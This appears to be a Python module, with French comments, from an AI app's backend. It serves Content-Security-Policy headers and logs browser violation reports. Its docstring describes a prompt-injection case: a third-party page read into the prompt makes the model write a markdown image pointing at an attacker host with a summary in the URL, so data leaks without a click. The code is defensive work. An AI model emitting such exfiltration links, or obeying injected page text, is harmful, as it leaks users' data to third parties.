"""Content-Security-Policy en OBSERVATION, et journal de ses violations.

Pourquoi (``docs/etude-isolation-modules.md`` §1.2 et §3 c1) : l'interface
n'avait aucune CSP, et un composant généré rendu sur la même origine pouvait
envoyer n'importe quoi à un hôte tiers (``fetch``, WebSocket, image). La CSP
limite cette EXFILTRATION VERS L'EXTÉRIEUR, et rien d'autre : un composant sur
la même origine garde le token et l'accès aux endpoints locaux (l'étude le
dit ; seule une iframe sandboxée couvre ce cas).

**Report-Only pour le reste de la politique** (décision du 2026-09-26) : une
semaine d'usage réel d'abord, puis lecture du journal. Le navigateur signale
seulement ce qu'une politique bloquante aurait refusé. Si le journal montre
qu'une fonction légitime serait cassée (Vite en dev, KaTeX, images générées,
ComfyUI, Monaco), on le RAPPORTE — on n'élargit pas la politique à l'aveugle
pour faire taire le journal.

**Exception : ``img-src`` est BLOQUANT** (décision d'Ilyann du 2026-10-18,
PR #66), via un second en-tête ``Content-Security-Policy`` réduit à cette
seule directive (:func:`politique_bloquante`) — et RETIRÉE du Report-Only :
une directive vit dans un seul en-tête. Mesuré le 2026-10-18 (Edge 155,
CDP) : présente dans les deux, une image bloquée produisait deux rapports
(``enforce`` + ``report``), comptés deux fois dans le journal. Déclencheur : la lecture
directe d'URL injecte dans le prompt le texte d'une page écrite par un tiers,
qui peut faire écrire au modèle ``![](https://attaquant/?q=<résumé>)`` — une
``<img>`` se charge sans clic. Le filtrage par liste côté rendu
(``ImagesAutoriseesContext``) reste en place comme seconde couche ; la CSP
couvre en plus ce que ce filtrage ne voit pas (composant de module, tout tour
sans lecture d'URL). Vérifié avant de basculer : toutes les images
légitimes de l'interface passent par ``blob:`` (module image, aperçus), aucun
module du catalogue ne pose d'``<img>`` distante.

**Chaîne de rapport prouvée** le 2026-10-18 (Edge 155 headless, CDP), en dev
(Vite :5173 → backend :8000) puis backend servant le build : une image
distante (en-tête bloquant) et un ``fetch`` hors ``connect-src`` (Report-Only)
produisent chacun un ``POST`` ``application/csp-report`` vers ``report-uri``,
reçu en 204 et écrit dans le journal. Le fichier journal n'est créé qu'à la
première violation reçue : son absence voulait donc dire « aucune violation
encore », pas « chaîne cassée ». Un blocage d'image légitime remontera dans
ce journal (``report-uri`` est posé sur les deux en-têtes). Verrouillé par
``test_csp_observation.py`` (corps réel du navigateur rejoué jusqu'au
fichier ; ``report-uri`` de dev absolu, Vite n'ayant aucun proxy).

Relevé pendant cette mesure, corrigé depuis (``src/api.ts``) : sur le build
ouvert par ``http://127.0.0.1:8000/``, l'interface appelait
``http://localhost:8000`` — autre origine, 14 violations de ``connect-src
'self'``. Un build appelle désormais toujours la même origine ; banc CDP :
0 violation ``connect-src`` par ``127.0.0.1:8000`` comme par ``localhost:8000``.

Une seule définition des directives, ici. Deux consommateurs :

- le backend, sur ``index.html`` quand il sert l'interface construite (paquet,
  ``tools/dev-epure.ps1``) — le backend y est ``'self'`` ;
- Vite en développement (``frontend/vite.config.ts``, ``server.headers``),
  lancé par le tray — le backend y est une AUTRE origine (:8000), d'où
  :data:`ORIGINES_BACKEND_DEV`. La copie côté Vite est comparée à celle-ci par
  ``test_csp_observation.py``.

Le journal est AGRÉGÉ (directive × origine bloquée × document ×
disposition), et le point de collecte n'exige pas de token — le navigateur
envoie ses rapports sans en-tête ``Authorization``. Bornes (2026-10-18, après
relevé : 64 Kio, 200 entrées en gardant les PREMIÈRES, hôte non tronqué —
120 Ko pour une seule entrée — et tout ``Content-Type`` accepté) :

- corps de 16 Kio au plus ;
- seuls ``application/csp-report`` et ``application/reports+json``, les deux
  types qu'emploie le navigateur. ``text/plain`` était une requête « simple »
  (sans préflight) qu'une page tierce pouvait envoyer à l'aveugle ; les deux
  types retenus, eux, exigent un préflight CORS pour un ``fetch``. Reste
  possible : une page tierce dont la PROPRE CSP pointe ``report-uri`` ici —
  d'où les bornes suivantes ;
- 500 entrées, les plus récemment vues gardées (une page qui remplit le
  journal tôt ne rend plus muette une violation ultérieure) ;
- chaque champ tronqué : la taille du journal est bornée, pas seulement le
  nombre d'entrées.

Le contenu est une donnée affichée, jamais interprétée (React échappe le
texte).
"""

import time
from typing import Any
from urllib.parse import urlsplit

from core.jsonstore import read_json, transaction
from core.paths import resolve_data_dir

#: Chemin du point de collecte (exempté d'authentification dans main.py).
CHEMIN_RAPPORT = "/csp/report"
#: Taille maximale d'un corps de rapport accepté (octets).
TAILLE_MAX = 16 * 1024
#: Nombre maximal d'entrées agrégées conservées (les plus récemment vues).
ENTREES_MAX = 500
#: Seuls types de corps acceptés : ceux du navigateur (``report-uri``,
#: ``report-to``). Cf. la docstring du module.
TYPES_ACCEPTES = ("application/csp-report", "application/reports+json")
#: Longueur maximale d'une origine ou d'un champ court conservé.
_LONGUEUR_ORIGINE = 200

#: Origines du backend vu depuis Vite (:5173) — en dev, ce n'est pas ``'self'``.
ORIGINES_BACKEND_DEV = (
    "http://localhost:8000", "ws://localhost:8000",
    "http://127.0.0.1:8000", "ws://127.0.0.1:8000",
)

#: Directives, dans l'ordre. ``{backend}`` : origines du backend si ce n'est
#: pas la même origine que la page. cdn.jsdelivr.net : Monaco (module ``code``)
#: s'y charge par défaut, relevé dans l'étude (§1.2).
DIRECTIVES = (
    "connect-src 'self'{backend} https://cdn.jsdelivr.net",
    "img-src 'self' data: blob:",
    "object-src 'none'",
    "frame-ancestors 'none'",
)


#: Directives BLOQUANTES (en-tête ``Content-Security-Policy``) — sous-ensemble
#: de :data:`DIRECTIVES`, cf. la docstring du module pour la décision. Elles
#: sont RETIRÉES de :func:`politique` (Report-Only) : sinon chaque blocage
#: produit aussi un rapport ``report`` et le journal compte deux fois.
DIRECTIVES_BLOQUANTES = ("img-src 'self' data: blob:",)
assert all(d in DIRECTIVES for d in DIRECTIVES_BLOQUANTES)


def politique(origines_backend: tuple[str, ...] = (), rapport: str = CHEMIN_RAPPORT) -> str:
    """Valeur de ``Content-Security-Policy-Report-Only`` : les directives
    qui ne sont pas bloquantes."""
    backend = "".join(f" {o}" for o in origines_backend)
    parties = [d.format(backend=backend) for d in DIRECTIVES if d not in DIRECTIVES_BLOQUANTES]
    # ``report-uri`` SEUL, et pas ``report-to`` : mesuré le 2026-09-26 (Edge,
    # CDP), dès que ``report-to`` est présent Chromium ignore ``report-uri`` et
    # met les rapports en file dans l'API Reporting — ils y restaient
    # « Pending » sans jamais atteindre le backend, et le journal restait vide.
    # ``report-uri`` est déprécié mais livré tout de suite (Chromium, Firefox).
    parties.append(f"report-uri {rapport}")
    return "; ".join(parties)


def politique_bloquante(rapport: str = CHEMIN_RAPPORT) -> str:
    """Valeur de ``Content-Security-Policy`` (bloquant) : ``img-src`` seul."""
    return "; ".join([*DIRECTIVES_BLOQUANTES, f"report-uri {rapport}"])


def entetes(rapport: str = CHEMIN_RAPPORT) -> dict[str, str]:
    """En-têtes posés sur ``index.html`` servi par le backend (même origine)."""
    return {
        "Content-Security-Policy-Report-Only": politique(rapport=rapport),
        "Content-Security-Policy": politique_bloquante(rapport=rapport),
    }


#: En-tête servi → mode affiché.
_MODES = {"Content-Security-Policy": "bloquant",
          "Content-Security-Policy-Report-Only": "report-only"}


def directives_servies() -> list[dict]:
    """Mode de chaque directive, LU dans :func:`entetes` — la fonction même
    qui pose les en-têtes sur ``index.html`` —, jamais recopié : si la
    politique servie change, ce que Réglages affiche change avec elle.
    ``report-uri`` n'est pas une directive de contrôle, elle est omise."""
    sortie = []
    for entete, valeur in entetes().items():
        for partie in valeur.split(";"):
            nom, _, reste = partie.strip().partition(" ")
            if nom and nom != "report-uri":
                sortie.append({"directive": nom, "mode": _MODES.get(entete, entete),
                               "valeur": reste.strip()})
    return sortie


def type_accepte(content_type: str | None) -> bool:
    """``Content-Type`` d'un rapport du navigateur (paramètres et casse
    ignorés) ?"""
    return (content_type or "").split(";")[0].strip().lower() in TYPES_ACCEPTES


def _journal():
    """Fonction et non constante : cf. core.paths.resolve_data_dir."""
    return resolve_data_dir() / "csp_violations.json"


def _origine(url: Any) -> str:
    """Réduit une URL bloquée à son origine (``inline``, ``eval``… tels quels) :
    le chemin complet porterait des paramètres, parfois sensibles, et
    multiplierait les entrées sans rien apprendre de plus."""
    s = str(url or "")[:2048]
    try:
        parts = urlsplit(s)
    except ValueError:  # IPv6 mal formé, par exemple : rien à en tirer
        return s[:80]
    if parts.scheme and parts.netloc:
        return f"{parts.scheme}://{parts.netloc}"[:_LONGUEUR_ORIGINE]
    return (parts.scheme or s)[:80]


def _normaliser(brut: Any) -> list[dict]:
    """Deux formats : ``report-uri`` (``{"csp-report": {...}}``, tirets) et
    ``report-to`` (liste de ``{"type": "csp-violation", "body": {...}}``,
    camelCase). Tout le reste est ignoré."""
    rapports = []
    if isinstance(brut, dict) and isinstance(brut.get("csp-report"), dict):
        r = brut["csp-report"]
        rapports.append({
            "directive": r.get("effective-directive") or r.get("violated-directive"),
            "bloque": r.get("blocked-uri"),
            "document": r.get("document-uri"),
            "source": r.get("source-file"),
            "disposition": r.get("disposition"),
        })
    elif isinstance(brut, list):
        for item in brut:
            if not isinstance(item, dict) or item.get("type") != "csp-violation":
                continue
            b = item.get("body") if isinstance(item.get("body"), dict) else {}
            rapports.append({
                "directive": b.get("effectiveDirective"),
                "bloque": b.get("blockedURL"),
                "document": b.get("documentURL"),
                "source": b.get("sourceFile"),
                "disposition": b.get("disposition"),
            })
    return rapports


def enregistrer(brut: Any) -> int:
    """Agrège les rapports reçus dans le journal. Retourne le nombre retenu.

    Ordre d'insertion = ordre de dernière vue (une entrée revue est replacée
    en fin), conservé par le JSON : au-delà de :data:`ENTREES_MAX`, on retire
    par le début. Pas un tri sur ``dernier`` : un envoi groupé donne la même
    seconde à toutes ses entrées."""
    rapports = _normaliser(brut)
    if not rapports:
        return 0
    maintenant = int(time.time())
    with transaction(_journal(), {"entrées": {}}) as doc:
        entrees = doc.setdefault("entrées", {})
        for r in rapports:
            directive = str(r["directive"] or "?")[:60]
            disposition = str(r["disposition"] or "?")[:20]
            bloque = _origine(r["bloque"])
            document = _origine(r["document"])
            cle = f"{directive}|{bloque}|{document}|{disposition}"
            e = entrees.pop(cle, None) or {
                "directive": directive, "bloqué": bloque, "document": document,
                "disposition": disposition, "source": _origine(r["source"]),
                "nombre": 0, "premier": maintenant,
            }
            e["nombre"] += 1
            e["dernier"] = maintenant
            entrees[cle] = e
            while len(entrees) > ENTREES_MAX:
                del entrees[next(iter(entrees))]
    return len(rapports)


def lire() -> list[dict]:
    """Entrées du journal, les plus récentes d'abord."""
    doc = read_json(_journal(), {"entrées": {}})
    entrees = list((doc.get("entrées") or {}).values()) if isinstance(doc, dict) else []
    return sorted(entrees, key=lambda e: e.get("dernier", 0), reverse=True)


def vider() -> None:
    with transaction(_journal(), {"entrées": {}}) as doc:
        doc["entrées"] = {}
